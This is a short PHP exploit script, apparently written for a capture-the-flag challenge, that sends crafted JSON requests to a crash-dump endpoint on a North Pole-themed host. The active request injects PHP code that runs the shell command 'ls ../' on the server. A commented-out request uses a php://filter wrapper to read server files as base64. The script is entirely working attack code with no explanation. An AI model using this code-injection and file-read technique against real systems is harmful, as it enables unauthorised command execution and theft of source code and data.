<?php
$url = 'http://ex.northpolewonderland.com/exception.php';
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$httpheaders = array();
$httpheaders[] = 'Content-Type: application/json';
curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheaders);

$postfields = array();

$postfields['operation'] = 'WriteCrashDump';
$postfields['data'] = "'); echo `ls ../`; echo ('";

/*
$postfields['operation'] = 'ReadCrashDump';
$data = array();
$data['crashdump'] = "php://filter/convert.base64-encode/resource=crashdump-rqXxSw";
$postfields['data'] = $data;
*/

$jsondata = json_encode($postfields);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsondata);

$resp = curl_exec($ch);
if ($resp == false) echo curl_error($ch);
var_dump($resp);
echo "\n";
echo base64_decode($resp);
echo "\n";
?>